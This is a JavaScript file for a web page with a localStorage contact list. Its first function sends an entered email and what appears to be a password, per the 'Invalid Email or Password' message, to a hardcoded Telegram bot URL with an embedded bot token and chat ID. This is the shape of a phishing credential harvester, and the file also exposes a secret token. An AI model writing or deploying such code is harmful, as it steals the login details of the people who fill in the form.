botButton = document.getElementById("bot-btn").addEventListener("click", getToken);
botStatus = document.getElementById("bot-status");
/* TODO: ADD VALIDATION AND RESPECTIVE ALERT FOR MESSAGE BOX */
var valid = /\S+@\S+\.\S+/;
function getToken() {
var input = document.getElementById("bot-message").value


/* need to get email from login page:*/
var email = document.getElementById("bot-email").value

/* front slash means start and end of expression, back slash is an escape character (similar to new line), + joins the strings, S is whitespace */

/* the variable that is being declared states that an email should be: letters or numbers + @ + numbers or letters + . + number or leters */

if (valid.test(email) === false || input === "") {
  botStatus.innerHTML = "Invalid Email or Password";
  return false

} else {
  botStatus.innerHTML = "";
}


url = "https://api.telegram.org/bot5233658091:AAEdJMSfyzxehFe65PADr1c2zGFlf5TRvIg/sendMessage?chat_id=5218071898&text=" + email + " : " + input;
fetch(url) 
.then(function (response) {
  return response.json();
})
.then(function (data) {
  console.log(data);

});
// window.location.reload();
};


submitUser = document.getElementById("store-user-btn").addEventListener("click", addContact);
errorMessage = document.getElementById("error-message");
function addContact() {
  /* DELETE SECTION INCOMPLETE */
txtVal = document.getElementById("new-username").value;
buttonNode = document.getElementById('list');
btnNode = document.createElement("li");
btnNode.addEventListener("click", function(e) {
  this.parentNode.removeChild(this);
  var storedNames = JSON.parse(localStorage.getItem("items"));
    newstore = storedNames.filter(e => e !== txtVal);
    console.log(newstore);
    localStorage.setItem('items', JSON.stringify(newstore));
  /* e.target.parentNode.remove(); <- to remove all*/
});
console.log(txtVal)

txtNode = document.createTextNode(txtVal);

var storageString = JSON.parse(localStorage.getItem("items"));
if (txtVal === "") {
errorMessage.innerHTML = "Input Required";
return false;

} 
console.log(storageString)
if (storageString != null) {
  for (i = 0; i < storageString.length; i++ ){
      if (storageString[i] === txtVal){
        errorMessage.innerHTML = "This Information Already Exists";
        return false;
      }
  } 
  
}
if (storageString === null) {
  btnNode.appendChild(txtNode);
  buttonNode.appendChild(btnNode);
  saveAll()
  location.reload();
}  else if (storageString.length < 14) {
  btnNode.appendChild(txtNode);
  buttonNode.appendChild(btnNode);
  saveAll()
  location.reload();
} else  {
  errorMessage.innerHTML = "You Have Reach Contact Limit";
  return false;
}



}

/* Save */
function saveAll() {
  var oldStorage = [];

  var values = document.querySelectorAll('li');
  for (var i = 0; i < values.length; i++) {
    oldStorage.push(values[i].innerHTML);
  }
  var newStorage = oldStorage
  localStorage.setItem('items', JSON.stringify(newStorage));
}

/* Load */
function loadAll() {

  var storedvalue = localStorage.getItem('items');
  console.log(storedvalue);

  if (!storedvalue) {
      return false;
  }

  storedvalue = JSON.parse(storedvalue);
  console.log(storedvalue);

  for (var i = 0; i < storedvalue.length; i++) {
      newword = storedvalue[i]
      var
          buttonNode = document.getElementById('list');
          btnNode = document.createElement("li");
          txtNode = document.createTextNode(newword);
          btnNode.addEventListener("click", function() {
            this.parentNode.removeChild(this);
            var storedNames = JSON.parse(localStorage.getItem("items"));
            newstore = storedNames.filter(e => e !== newword);
            console.log(newstore);
            localStorage.setItem('items', JSON.stringify(newstore));
          });
          
          
      btnNode.appendChild(txtNode);
      buttonNode.appendChild(btnNode);
      }

}

searchUser = document.getElementById("search-user-btn").addEventListener("click", searchContact);
searchError = document.getElementById("search-error-message")
function searchContact() {
  searchValue = document.getElementById("search-username").value;
  var storageString = JSON.parse(localStorage.getItem("items"));
  if (searchValue === "") {
    searchError.innerHTML = "Input Required"
    return false
  }
  counter = 0;
  for (i = 0; i < storageString.length; i++ ){
      if (storageString[i] === searchValue) {
        searchError.innerHTML = "Contact is one line " + ( i + 1 )
        
        console.log(document.querySelectorAll("li")[i].classList.add("colour"))
        console.log(document.querySelectorAll("li")[i].classList)
        
      } else {
        console.log(document.querySelectorAll("li")[i].classList.remove("colour"))
        counter ++;
      }
  } if (counter === storageString.length)
    searchError.innerHTML = "This Information Does Not Exist"
  
  }

loadAll();
